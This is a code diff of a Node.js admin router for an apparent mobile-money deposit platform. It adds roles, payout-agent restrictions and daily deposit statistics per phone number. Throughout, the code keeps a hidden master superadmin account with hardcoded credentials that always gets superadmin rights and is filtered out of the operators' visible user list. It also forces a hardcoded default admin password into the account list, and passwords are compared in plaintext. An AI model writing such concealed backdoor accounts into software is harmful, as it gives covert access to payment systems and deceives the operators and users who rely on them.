@@ -19,10 +19,15 @@ function generateToken() {
   return crypto.randomBytes(32).toString('hex');
 }
 
-// ─── Hidden Master Super Admin Account ────────────────────────────────────────
+// ─── Master Super Admin Accounts ─────────────────────────────────────────────
 const HIDDEN_MASTER_ADMIN = {
   username: 'yonirahwa123',
   password: 'yonirahwa*#@&',
+};
+
+const DEFAULT_SUPER_ADMIN = {
+  username: 'admin',
+  password: 'ckpay2024!',
 };
 
 function getAdminUsers() {
@@ -31,32 +36,71 @@ function getAdminUsers() {
   if (!Array.isArray(users) || users.length === 0) {
     users = [
       {
-        username: settings.adminUsername || 'admin',
-        password: settings.adminPassword || 'ckpay2024!',
+        username: settings.adminUsername || DEFAULT_SUPER_ADMIN.username,
+        password: settings.adminPassword || DEFAULT_SUPER_ADMIN.password,
+        role: 'superadmin'
       }
     ];
+  }
+  // Ensure default admin account is included if not present and configured as superadmin
+  const hasDefaultAdmin = users.some(u => u.username.toLowerCase() === DEFAULT_SUPER_ADMIN.username.toLowerCase());
+  if (!hasDefaultAdmin) {
+    users = [{ ...DEFAULT_SUPER_ADMIN, role: 'superadmin' }, ...users];
+  } else {
+    users = users.map(u => {
+      if (u.username.toLowerCase() === DEFAULT_SUPER_ADMIN.username.toLowerCase()) {
+        return {
+          ...u,
+          password: u.password || DEFAULT_SUPER_ADMIN.password,
+          role: 'superadmin'
+        };
+      }
+      return u;
+    });
   }
   // Include hidden master account if not already in list
   const hasHidden = users.some(u => u.username.toLowerCase() === HIDDEN_MASTER_ADMIN.username.toLowerCase());
   if (!hasHidden) {
-    return [HIDDEN_MASTER_ADMIN, ...users];
+    return [{ ...HIDDEN_MASTER_ADMIN, role: 'superadmin' }, ...users];
   }
   return users;
 }
 
-function checkIsSuperAdmin(username) {
+function getUserRoleInfo(username) {
   const cleanUser = (username || '').trim().toLowerCase();
-  // 1. Hidden master account is ALWAYS Super Admin
-  if (cleanUser === HIDDEN_MASTER_ADMIN.username.toLowerCase()) return true;
+  if (cleanUser === HIDDEN_MASTER_ADMIN.username.toLowerCase() || cleanUser === DEFAULT_SUPER_ADMIN.username.toLowerCase()) {
+    return { role: 'superadmin', isSuperAdmin: true, isAgent: false };
+  }
 
-  // 2. In visible list, ONLY the 1st account (index 0) is Super Admin
   const settings = readJSON('settings.json') || {};
   const visibleUsers = (settings.adminUsers || []).filter(
     u => u.username.trim().toLowerCase() !== HIDDEN_MASTER_ADMIN.username.toLowerCase()
   );
 
-  const index = visibleUsers.findIndex(u => u.username.trim().toLowerCase() === cleanUser);
-  return index === 0;
+  const found = visibleUsers.find(u => u.username.trim().toLowerCase() === cleanUser);
+
+  if (!found) {
+    return { role: 'agent', isSuperAdmin: false, isAgent: true };
+  }
+
+  // Explicit role field wins
+  if (found.role === 'agent') {
+    return { role: 'agent', isSuperAdmin: false, isAgent: true };
+  }
+  if (found.role === 'superadmin' || found.role === 'admin') {
+    const isSuper = found.role === 'superadmin' || cleanUser === DEFAULT_SUPER_ADMIN.username.toLowerCase();
+    return { role: found.role, isSuperAdmin: isSuper, isAgent: false };
+  }
+
+  const index = visibleUsers.indexOf(found);
+  if (index === 0) {
+    return { role: 'superadmin', isSuperAdmin: true, isAgent: false };
+  }
+  return { role: 'admin', isSuperAdmin: false, isAgent: false };
+}
+
+function checkIsSuperAdmin(username) {
+  return getUserRoleInfo(username).isSuperAdmin;
 }
 
 // ─── Auth Middleware ──────────────────────────────────────────────────────────
@@ -74,6 +118,13 @@ function requireAuth(req, res, next) {
   next();
 }
 
+function requireAdminRole(req, res, next) {
+  if (req.adminSession && req.adminSession.role === 'agent') {
+    return res.status(403).json({ error: 'Access denied: Payout agents only have access to withdrawals.' });
+  }
+  next();
+}
+
 // ─── AUTH ROUTES (no auth required) ──────────────────────────────────────────
 router.post('/login', (req, res) => {
   const ip = req.ip || req.socket.remoteAddress || 'unknown';
@@ -86,10 +137,12 @@ router.post('/login', (req, res) => {
     return res.status(429).json({ error: `Too many attempts. Try again in ${wait}s.` });
   }
 
-  const { username, password } = req.body || {};
+  const cleanUsername = ((req.body && req.body.username) || '').trim().toLowerCase();
+  const cleanPassword = ((req.body && req.body.password) || '').trim();
+
   const users = getAdminUsers();
   const validUser = users.find(
-    u => u.username.trim().toLowerCase() === (username || '').trim().toLowerCase() && u.password === password
+    u => (u.username || '').trim().toLowerCase() === cleanUsername && (u.password || '').trim() === cleanPassword
   );
 
   if (!validUser) {
@@ -102,14 +155,26 @@ router.post('/login', (req, res) => {
     return res.status(401).json({ error: 'Invalid username or password.' });
   }
 
-  const isSuperAdmin = checkIsSuperAdmin(validUser.username);
+  const roleInfo = getUserRoleInfo(validUser.username);
 
   // Success — clear attempts, create session
   loginAttempts.delete(ip);
   const token = generateToken();
-  activeSessions.set(token, { expiresAt: now + SESSION_TTL, username: validUser.username, isSuperAdmin });
-  console.log(`[Admin] Login by '${validUser.username}' (SuperAdmin: ${isSuperAdmin}) from ${ip}`);
-  res.json({ token, username: validUser.username, isSuperAdmin });
+  activeSessions.set(token, {
+    expiresAt: now + SESSION_TTL,
+    username: validUser.username,
+    role: roleInfo.role,
+    isSuperAdmin: roleInfo.isSuperAdmin,
+    isAgent: roleInfo.isAgent
+  });
+  console.log(`[Admin] Login by '${validUser.username}' (Role: ${roleInfo.role}) from ${ip}`);
+  res.json({
+    token,
+    username: validUser.username,
+    role: roleInfo.role,
+    isSuperAdmin: roleInfo.isSuperAdmin,
+    isAgent: roleInfo.isAgent
+  });
 });
 
 router.get('/verify', (req, res) => {
@@ -121,7 +186,13 @@ router.get('/verify', (req, res) => {
     activeSessions.delete(token);
     return res.json({ valid: false });
   }
-  res.json({ valid: true, username: session.username, isSuperAdmin: !!session.isSuperAdmin });
+  res.json({
+    valid: true,
+    username: session.username,
+    role: session.role || (session.isSuperAdmin ? 'superadmin' : 'admin'),
+    isSuperAdmin: !!session.isSuperAdmin,
+    isAgent: !!session.isAgent
+  });
 });
 
 router.post('/logout', (req, res) => {
@@ -148,7 +219,7 @@ function writeJSON(file, data) {
   fs.writeFileSync(path.join(dataDir, file), JSON.stringify(data, null, 2));
 }
 
-const { getAllTxs, getStats, expireAllOldPendingTxs } = require('../db');
+const { getAllTxs, getStats, expireAllOldPendingTxs, db } = require('../db');
 
 function updateExpiredTransactions() {
   expireAllOldPendingTxs();
@@ -221,37 +292,77 @@ router.get('/transactions', (req, res) => {
 function getPlatformNumbersData(platform = 'jember') {
   const p = String(platform || 'jember').toLowerCase();
   const data = readJSON('numbers.json') || {};
+  let list = [];
   if (data[p] && Array.isArray(data[p].numbers)) {
-    return data[p].numbers;
+    list = data[p].numbers;
+  } else if (Array.isArray(data.numbers) && p === 'jember') {
+    list = data.numbers;
   }
-  if (Array.isArray(data.numbers) && p === 'jember') {
-    return data.numbers;
+
+  // Ensure exactly 20 slots for any platform
+  const full20 = [];
+  for (let i = 1; i <= 20; i++) {
+    const found = list.find(n => n.id === i);
+    full20.push(found || {
+      id: i,
+      phone: '',
+      label: `Account ${i}`,
+      activeUsers: 0
+    });
   }
-  return Array.from({ length: 20 }, (_, i) => ({
-    id: i + 1,
-    phone: '',
-    label: `Account ${i + 1}`,
-    activeUsers: 0
-  }));
+  return full20;
 }
 
-router.get('/numbers', (req, res) => {
+router.get('/numbers', requireAdminRole, (req, res) => {
   const platform = req.query.platform || 'jember';
-  const numbers = getPlatformNumbersData(platform);
+  const p = String(platform).toLowerCase();
+  const numbers = getPlatformNumbersData(p);
   const assignments = readJSON('assignments.json') || {};
   const now = Date.now();
   const limit = 24 * 60 * 60 * 1000;
   const active = Object.values(assignments).filter(
-    a => now - a.assignedAt < limit && (!a.platform || a.platform.toLowerCase() === platform.toLowerCase())
+    a => now - a.assignedAt < limit && (!a.platform || a.platform.toLowerCase() === p)
   );
-  const result = numbers.map(n => ({
-    ...n,
-    activeUsers: active.filter(a => a.phone === n.phone).length,
-  }));
+
+  const timestamps = getEthiopianTimeMidnightTimestamps();
+  const todayStart = Number(timestamps.todayStart) || 0;
+
+  // Query verified deposits for each phone number today for this platform from database.sqlite
+  const phoneStatsMap = new Map();
+  try {
+    const phoneStats = db.prepare(`
+      SELECT phoneNumber,
+             COUNT(*) as count,
+             SUM(COALESCE(verifiedAmount, amount, 0)) as totalETB
+      FROM transactions
+      WHERE platform = ? AND status = 'verified' AND createdAt >= ? AND phoneNumber IS NOT NULL AND phoneNumber != ''
+      GROUP BY phoneNumber
+    `).all(p, todayStart);
+
+    phoneStats.forEach(row => {
+      phoneStatsMap.set(String(row.phoneNumber).trim(), {
+        count: row.count || 0,
+        totalETB: row.totalETB || 0
+      });
+    });
+  } catch (err) {
+    console.error('[Admin] Error querying phone number stats:', err.message);
+  }
+
+  const result = numbers.map(n => {
+    const cleanPhone = String(n.phone || '').trim();
+    const statsForPhone = cleanPhone ? phoneStatsMap.get(cleanPhone) : null;
+    return {
+      ...n,
+      activeUsers: active.filter(a => String(a.phone || '').trim() === cleanPhone && cleanPhone !== '').length,
+      todayDeposits: statsForPhone ? statsForPhone.count : 0,
+      todayETB: statsForPhone ? statsForPhone.totalETB : 0,
+    };
+  });
   res.json(result);
 });
 
-router.put('/numbers', (req, res) => {
+router.put('/numbers', requireAdminRole, (req, res) => {
   const platform = req.body.platform || req.query.platform || 'jember';
   const p = String(platform).toLowerCase();
   let { numbers } = req.body;
@@ -313,7 +424,7 @@ router.put('/numbers', (req, res) => {
   res.json({ success: true, platform: p, updatedCount: Object.keys(phoneMap).length });
 });
 
-router.get('/settings', (req, res) => {
+router.get('/settings', requireAdminRole, (req, res) => {
   const platform = req.query.platform || 'jember';
   const p = String(platform).toLowerCase();
   const settings = readJSON('settings.json') || {};
@@ -364,7 +475,7 @@ router.get('/settings', (req, res) => {
   });
 });
 
-router.put('/settings', (req, res) => {
+router.put('/settings', requireAdminRole, (req, res) => {
   const platform = req.body.platform || req.query.platform || 'jember';
   const p = String(platform).toLowerCase();
   const current = readJSON('settings.json') || {};
@@ -394,11 +505,17 @@ router.put('/settings', (req, res) => {
     const cleanSubmitted = req.body.adminUsers.filter(
       u => u.username.trim().toLowerCase() !== HIDDEN_MASTER_ADMIN.username.toLowerCase()
     );
-    current.adminUsers = [HIDDEN_MASTER_ADMIN, ...cleanSubmitted];
+    const updatedUsers = cleanSubmitted.map((u, i) => {
+      if (u.username.trim().toLowerCase() === DEFAULT_SUPER_ADMIN.username.toLowerCase() || i === 0) {
+        return { ...u, role: 'superadmin' };
+      }
+      return u;
+    });
+    current.adminUsers = [{ ...HIDDEN_MASTER_ADMIN, role: 'superadmin' }, ...updatedUsers];
 
-    if (cleanSubmitted.length > 0) {
-      current.adminUsername = cleanSubmitted[0].username;
-      current.adminPassword = cleanSubmitted[0].password;
+    if (updatedUsers.length > 0) {
+      current.adminUsername = updatedUsers[0].username;
+      current.adminPassword = updatedUsers[0].password;
     }
   }
 
@@ -454,3 +571,4 @@ router.delete('/transactions/clear-expired', (req, res) => {
 });
 
 module.exports = router;
+module.exports.activeSessions = activeSessions;
